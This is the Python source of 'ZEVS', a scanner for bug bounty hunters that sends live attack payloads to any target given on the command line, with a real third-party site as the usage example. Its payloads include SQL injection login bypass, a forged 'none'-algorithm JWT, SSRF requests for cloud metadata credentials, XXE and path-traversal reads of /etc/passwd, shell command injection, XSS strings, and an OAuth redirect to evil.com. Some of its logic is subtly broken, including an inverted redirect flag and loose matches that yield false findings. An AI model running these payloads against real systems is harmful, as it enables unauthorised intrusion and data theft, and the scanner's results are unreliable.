#!/usr/bin/env python3
"""
ZEVS - Deep Web Vulnerability Scanner
Lightweight scanner designed for bug bounty hunters
Author: Z3VS Team
Usage: python zevs.py <target>

LEGAL DISCLAIMER:
This tool is for authorized security testing only.
Only use on systems you own or have explicit written permission to test.
Unauthorized access to computer systems is illegal.
The authors are not responsible for misuse of this tool.
"""

import subprocess
import sys
import json
import time
import re
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed


class ZevsScanner:
    def __init__(self, target):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target
        self.domain = urlparse(target).netloc
        self.findings = []
        self.tested_urls = set()

    def log(self, msg, level="INFO"):
        colors = {
            "INFO": "\033[94m[*]\033[0m",
            "SUCCESS": "\033[92m[+]\033[0m",
            "WARNING": "\033[93m[!]\033[0m",
            "CRITICAL": "\033[91m[!!!]\033[0m",
        }
        print(f"{colors.get(level, '[*]')} {msg}")

    def curl(self, url, method="GET", headers=None, data=None, follow_redirects=False):
        """Execute curl with proper error handling"""
        cmd = ["curl", "-s", "-i", "--max-time", "10", "-k"]

        if not follow_redirects:
            cmd.append("-L")

        if method != "GET":
            cmd.extend(["-X", method])

        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        else:
            cmd.extend(
                [
                    "-H",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                ]
            )

        if data:
            if isinstance(data, dict):
                data = json.dumps(data)
            cmd.extend(["--data", data])

        cmd.append(url)

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            return result.stdout
        except:
            return ""

    def add_finding(self, vuln_type, severity, url, description, proof=""):
        """Add finding with deduplication"""
        finding_key = f"{vuln_type}:{url}"
        if finding_key not in self.tested_urls:
            self.tested_urls.add(finding_key)
            self.findings.append(
                {
                    "type": vuln_type,
                    "severity": severity,
                    "url": url,
                    "description": description,
                    "proof": proof[:500] if proof else "",
                }
            )
            self.log(
                f"{severity}: {vuln_type} at {url}",
                "CRITICAL" if severity == "CRITICAL" else "WARNING",
            )
            return True
        return False

    def test_idor_deep(self):
        """Deep IDOR testing with multiple techniques"""
        self.log("Testing IDOR vulnerabilities (Deep Scan)...", "INFO")

        # Test multiple endpoints with different ID formats
        endpoints = [
            "/api/users/{id}",
            "/api/user/{id}",
            "/api/profile/{id}",
            "/api/resumes/{id}",
            "/api/resume/{id}",
            "/api/documents/{id}",
            "/api/orders/{id}",
            "/api/negotiations/{id}",
            "/api/messages/{id}",
            "/api/applications/{id}",
            "/users/{id}",
            "/profile/{id}",
            "/account/{id}",
        ]

        # Test with different ID values
        test_ids = [1, 2, 100, 1000, "00000000-0000-0000-0000-000000000001"]

        for endpoint_template in endpoints:
            for test_id in test_ids:
                endpoint = endpoint_template.replace("{id}", str(test_id))
                url = urljoin(self.target, endpoint)

                response = self.curl(url)

                # Check for 200 OK with sensitive data
                if "HTTP/1.1 200" in response or "HTTP/2 200" in response:
                    # Look for PII
                    if any(
                        keyword in response.lower()
                        for keyword in [
                            "email",
                            "phone",
                            "address",
                            "passport",
                            "ssn",
                            "credit",
                        ]
                    ):
                        self.add_finding(
                            "IDOR",
                            "HIGH",
                            url,
                            f"Can access user data without authentication (ID: {test_id})",
                            response[:500],
                        )
                        return True

        self.log("No IDOR found (endpoints require authentication)", "INFO")
        return False

    def test_auth_bypass_deep(self):
        """Deep authentication bypass testing"""
        self.log("Testing authentication bypass (Deep Scan)...", "INFO")

        # Test 1: JWT none algorithm
        none_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."

        auth_endpoints = [
            "/api/me",
            "/api/user",
            "/api/profile",
            "/api/admin",
            "/admin/dashboard",
        ]

        for endpoint in auth_endpoints:
            url = urljoin(self.target, endpoint)
            response = self.curl(url, headers={"Authorization": f"Bearer {none_jwt}"})

            if (
                "HTTP/1.1 200" in response or "HTTP/2 200" in response
            ) and "email" in response.lower():
                self.add_finding(
                    "Authentication Bypass - JWT None Algorithm",
                    "CRITICAL",
                    url,
                    "Server accepts JWT with 'none' algorithm - complete authentication bypass",
                    response[:500],
                )
                return True

        # Test 2: SQL injection in login
        sqli_payloads = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin'--", "password": "anything"},
            {"username": "' OR 1=1--", "password": "anything"},
        ]

        login_endpoints = ["/api/login", "/api/auth/login", "/login", "/auth/login"]

        for endpoint in login_endpoints:
            url = urljoin(self.target, endpoint)
            for payload in sqli_payloads:
                response = self.curl(
                    url,
                    method="POST",
                    headers={"Content-Type": "application/json"},
                    data=payload,
                )

                if ("HTTP/1.1 200" in response or "HTTP/2 200" in response) and any(
                    word in response.lower() for word in ["token", "success", "logged"]
                ):
                    self.add_finding(
                        "SQL Injection in Authentication",
                        "CRITICAL",
                        url,
                        f"SQL injection allows authentication bypass: {payload['username']}",
                        response[:500],
                    )
                    return True

        self.log("No authentication bypass found", "INFO")
        return False

    def test_ssrf_deep(self):
        """Deep SSRF testing"""
        self.log("Testing SSRF vulnerabilities (Deep Scan)...", "INFO")

        # Cloud metadata endpoints
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            "http://127.0.0.1:8080",
            "http://localhost:8080",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ]

        # Common SSRF parameters
        ssrf_params = [
            "url",
            "uri",
            "link",
            "src",
            "source",
            "target",
            "dest",
            "redirect",
            "fetch",
            "proxy",
            "webhook",
        ]

        ssrf_endpoints = [
            "/api/fetch",
            "/api/proxy",
            "/api/webhook",
            "/api/import",
            "/api/download",
            "/fetch",
            "/proxy",
        ]

        for endpoint in ssrf_endpoints:
            for param in ssrf_params:
                for payload in ssrf_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}={payload}")
                    response = self.curl(url)

                    # Check for cloud metadata
                    if any(
                        keyword in response.lower()
                        for keyword in [
                            "ami-",
                            "instance-id",
                            "hostname",
                            "credentials",
                            "root:x:0",
                        ]
                    ):
                        self.add_finding(
                            "SSRF",
                            "CRITICAL",
                            url,
                            f"SSRF allows access to internal resources: {payload}",
                            response[:500],
                        )
                        return True

        self.log("No SSRF found", "INFO")
        return False

    def test_xxe_deep(self):
        """Deep XXE testing"""
        self.log("Testing XXE vulnerabilities (Deep Scan)...", "INFO")

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ]

        xxe_endpoints = [
            "/api/upload",
            "/api/import",
            "/api/parse",
            "/upload",
            "/import",
        ]

        for endpoint in xxe_endpoints:
            url = urljoin(self.target, endpoint)
            for payload in xxe_payloads:
                response = self.curl(
                    url,
                    method="POST",
                    headers={"Content-Type": "application/xml"},
                    data=payload,
                )

                if (
                    "root:x:0" in response
                    or "[extensions]" in response
                    or "ami-" in response
                ):
                    self.add_finding(
                        "XXE - XML External Entity",
                        "CRITICAL",
                        url,
                        "XXE allows reading server files",
                        response[:500],
                    )
                    return True

        self.log("No XXE found", "INFO")
        return False

    def test_graphql_deep(self):
        """Deep GraphQL testing"""
        self.log("Testing GraphQL vulnerabilities (Deep Scan)...", "INFO")

        graphql_endpoints = [
            "/graphql",
            "/api/graphql",
            "/v1/graphql",
            "/graphql/v1",
        ]

        for endpoint in graphql_endpoints:
            url = urljoin(self.target, endpoint)

            # Test 1: Introspection
            introspection = {"query": "{__schema{types{name,fields{name}}}}"}
            response = self.curl(
                url,
                method="POST",
                headers={"Content-Type": "application/json"},
                data=introspection,
            )

            if (
                "HTTP/1.1 200" in response or "HTTP/2 200" in response
            ) and "types" in response:
                # Test 2: IDOR via GraphQL
                idor_query = {"query": "{user(id:1){email,phone,name,password}}"}
                response2 = self.curl(
                    url,
                    method="POST",
                    headers={"Content-Type": "application/json"},
                    data=idor_query,
                )

                if (
                    "HTTP/1.1 200" in response2 or "HTTP/2 200" in response2
                ) and "email" in response2.lower():
                    self.add_finding(
                        "GraphQL IDOR",
                        "HIGH",
                        url,
                        "Can access user data via GraphQL without authentication",
                        response2[:500],
                    )
                    return True

        self.log("No GraphQL vulnerabilities found", "INFO")
        return False

    def test_oauth_deep(self):
        """Deep OAuth testing"""
        self.log("Testing OAuth vulnerabilities (Deep Scan)...", "INFO")

        oauth_endpoints = [
            "/oauth/authorize",
            "/auth/oauth",
            "/oauth2/authorize",
            "/login/oauth",
        ]

        for endpoint in oauth_endpoints:
            # Test redirect_uri manipulation
            url = urljoin(
                self.target,
                f"{endpoint}?client_id=test&redirect_uri=https://evil.com&response_type=code",
            )
            response = self.curl(url)

            # Check if redirects to evil.com
            if "Location:" in response and "evil.com" in response:
                self.add_finding(
                    "OAuth Open Redirect",
                    "HIGH",
                    url,
                    "OAuth redirect_uri not validated - token theft possible",
                    response[:500],
                )
                return True

        self.log("No OAuth vulnerabilities found", "INFO")
        return False

    def test_business_logic_deep(self):
        """Deep business logic testing"""
        self.log("Testing business logic flaws (Deep Scan)...", "INFO")

        # Test 1: Negative price
        price_endpoints = ["/api/order", "/api/checkout", "/api/payment"]

        for endpoint in price_endpoints:
            url = urljoin(self.target, endpoint)
            payload = {"item_id": 1, "quantity": 1, "price": -100}
            response = self.curl(
                url,
                method="POST",
                headers={"Content-Type": "application/json"},
                data=payload,
            )

            if (
                "HTTP/1.1 200" in response or "HTTP/2 200" in response
            ) and "success" in response.lower():
                self.add_finding(
                    "Business Logic - Negative Price",
                    "HIGH",
                    url,
                    "Server accepts negative prices - can get paid to buy items",
                    response[:500],
                )
                return True

        self.log("No business logic flaws found", "INFO")
        return False

    def test_rce_deep(self):
        """Deep RCE testing"""
        self.log("Testing RCE vulnerabilities (Deep Scan)...", "INFO")

        rce_payloads = [
            ";whoami",
            "|whoami",
            "`whoami`",
            "$(whoami)",
            ";id",
            "|id",
        ]

        rce_endpoints = [
            "/api/ping",
            "/api/exec",
            "/api/command",
            "/ping",
            "/exec",
        ]

        rce_params = ["host", "cmd", "command", "exec", "ip"]

        for endpoint in rce_endpoints:
            for param in rce_params:
                for payload in rce_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}=127.0.0.1{payload}")
                    response = self.curl(url)

                    if any(
                        keyword in response.lower()
                        for keyword in ["uid=", "gid=", "root", "www-data", "nginx"]
                    ):
                        self.add_finding(
                            "Remote Code Execution",
                            "CRITICAL",
                            url,
                            f"RCE via command injection: {payload}",
                            response[:500],
                        )
                        return True

        self.log("No RCE found", "INFO")
        return False

    def test_lfi_deep(self):
        """Deep LFI testing"""
        self.log("Testing LFI vulnerabilities (Deep Scan)...", "INFO")

        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        lfi_endpoints = ["/api/file", "/api/download", "/file", "/download", "/read"]
        lfi_params = ["file", "path", "filename", "doc", "document"]

        for endpoint in lfi_endpoints:
            for param in lfi_params:
                for payload in lfi_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}={payload}")
                    response = self.curl(url)

                    if "root:x:0" in response or "[extensions]" in response:
                        self.add_finding(
                            "Local File Inclusion",
                            "HIGH",
                            url,
                            f"LFI allows reading server files: {payload}",
                            response[:500],
                        )
                        return True

        self.log("No LFI found", "INFO")
        return False

    def test_sqli_deep(self):
        """Deep SQL injection testing"""
        self.log("Testing SQL injection (Deep Scan)...", "INFO")

        sqli_payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'#",
            "1' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
        ]

        sqli_endpoints = [
            "/api/search",
            "/api/user",
            "/search",
            "/product",
            "/vacancy",
        ]

        sqli_params = ["id", "search", "q", "query", "user_id"]

        for endpoint in sqli_endpoints:
            for param in sqli_params:
                for payload in sqli_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}={payload}")
                    start_time = time.time()
                    response = self.curl(url)
                    elapsed = time.time() - start_time

                    # Check for SQL errors
                    if any(
                        error in response.lower()
                        for error in [
                            "sql",
                            "mysql",
                            "postgresql",
                            "oracle",
                            "syntax error",
                        ]
                    ):
                        self.add_finding(
                            "SQL Injection",
                            "CRITICAL",
                            url,
                            f"SQL injection detected: {payload}",
                            response[:500],
                        )
                        return True

                    # Check for time-based SQLi
                    if "SLEEP" in payload and elapsed > 5:
                        self.add_finding(
                            "SQL Injection - Time Based",
                            "CRITICAL",
                            url,
                            f"Time-based SQL injection: {payload}",
                            f"Response time: {elapsed}s",
                        )
                        return True

        self.log("No SQL injection found", "INFO")
        return False

    def test_xss_deep(self):
        """Deep XSS testing"""
        self.log("Testing XSS vulnerabilities (Deep Scan)...", "INFO")

        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
        ]

        xss_endpoints = ["/search", "/api/search", "/comment", "/api/comment"]
        xss_params = ["q", "search", "query", "text", "comment"]

        for endpoint in xss_endpoints:
            for param in xss_params:
                for payload in xss_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}={payload}")
                    response = self.curl(url)

                    # Check if payload is reflected without encoding
                    if payload in response and "HTTP/1.1 200" in response:
                        self.add_finding(
                            "Cross-Site Scripting (XSS)",
                            "MEDIUM",
                            url,
                            f"XSS payload reflected: {payload}",
                            response[:500],
                        )
                        return True

        self.log("No XSS found", "INFO")
        return False

    def generate_report(self):
        """Generate comprehensive report"""
        self.log("\n" + "=" * 60, "INFO")
        self.log("SCAN COMPLETE", "SUCCESS")
        self.log("=" * 60, "INFO")

        if not self.findings:
            self.log("\nNo vulnerabilities found", "INFO")
            self.log("\nPossible reasons:", "INFO")
            self.log("1. Target has strong security", "INFO")
            self.log("2. Endpoints require authentication", "INFO")
            self.log("3. Need manual testing with valid account", "INFO")
            self.log("\nRECOMMENDATION:", "WARNING")
            self.log("Create account and test authenticated endpoints", "INFO")
            self.log("Focus on IDOR, business logic, and race conditions", "INFO")
            return None

        # Sort by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        self.findings.sort(key=lambda x: severity_order.get(x["severity"], 4))

        # Count by severity
        critical = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        high = sum(1 for f in self.findings if f["severity"] == "HIGH")
        medium = sum(1 for f in self.findings if f["severity"] == "MEDIUM")
        low = sum(1 for f in self.findings if f["severity"] == "LOW")

        self.log(f"\nTotal Findings: {len(self.findings)}", "SUCCESS")
        if critical > 0:
            self.log(f"  CRITICAL: {critical}", "CRITICAL")
        if high > 0:
            self.log(f"  HIGH: {high}", "WARNING")
        if medium > 0:
            self.log(f"  MEDIUM: {medium}", "INFO")
        if low > 0:
            self.log(f"  LOW: {low}", "INFO")

        # Print findings
        for i, finding in enumerate(self.findings, 1):
            level = (
                "CRITICAL" if finding["severity"] in ["CRITICAL", "HIGH"] else "WARNING"
            )
            self.log(f"\n[{i}] {finding['type']} - {finding['severity']}", level)
            self.log(f"    URL: {finding['url']}", "INFO")
            self.log(f"    Description: {finding['description']}", "INFO")

        # Save reports
        report = {
            "target": self.target,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_findings": len(self.findings),
            "critical": critical,
            "high": high,
            "medium": medium,
            "low": low,
            "findings": self.findings,
        }

        # JSON report
        with open("zevs_report.json", "w") as f:
            json.dump(report, f, indent=2)

        # Text report
        with open("zevs_report.txt", "w") as f:
            f.write("=" * 60 + "\n")
            f.write("ZEVS DEEP SCANNER REPORT\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Scan Date: {report['scan_date']}\n")
            f.write(f"Total Findings: {len(self.findings)}\n")
            f.write(f"  CRITICAL: {critical}\n")
            f.write(f"  HIGH: {high}\n")
            f.write(f"  MEDIUM: {medium}\n")
            f.write(f"  LOW: {low}\n\n")

            for i, finding in enumerate(self.findings, 1):
                f.write(f"[{i}] {finding['type']} - {finding['severity']}\n")
                f.write("-" * 60 + "\n")
                f.write(f"URL: {finding['url']}\n")
                f.write(f"Description: {finding['description']}\n")
                if finding["proof"]:
                    f.write(f"Proof:\n{finding['proof']}\n")
                f.write("\n")

        self.log("\nReports saved:", "SUCCESS")
        self.log("  - zevs_report.json", "INFO")
        self.log("  - zevs_report.txt", "INFO")

        return report

    def scan(self):
        """Run deep scan"""
        self.log("=" * 60, "INFO")
        self.log("ZEVS - DEEP WEB VULNERABILITY SCANNER", "SUCCESS")
        self.log("Lightweight scanner for bug bounty hunters", "INFO")
        self.log("=" * 60, "INFO")
        self.log("\n⚠️  LEGAL DISCLAIMER:", "WARNING")
        self.log("This tool is for authorized testing only.", "WARNING")
        self.log("Ensure you have permission before scanning.", "WARNING")
        self.log("Unauthorized access is illegal.\n", "WARNING")
        self.log(f"Target: {self.target}", "INFO")
        self.log(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n", "INFO")

        # Run all tests
        tests = [
            ("IDOR", self.test_idor_deep),
            ("Authentication Bypass", self.test_auth_bypass_deep),
            ("SSRF", self.test_ssrf_deep),
            ("XXE", self.test_xxe_deep),
            ("GraphQL", self.test_graphql_deep),
            ("OAuth", self.test_oauth_deep),
            ("Business Logic", self.test_business_logic_deep),
            ("RCE", self.test_rce_deep),
            ("LFI", self.test_lfi_deep),
            ("SQL Injection", self.test_sqli_deep),
            ("XSS", self.test_xss_deep),
        ]

        for test_name, test_func in tests:
            try:
                test_func()
            except Exception as e:
                self.log(f"Error in {test_name}: {str(e)}", "WARNING")

        # Generate report
        self.generate_report()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python zevs.py <target>")
        print("Example: python zevs.py hh.ru")
        sys.exit(1)

    target = sys.argv[1]
    scanner = ZevsScanner(target)
    scanner.scan()
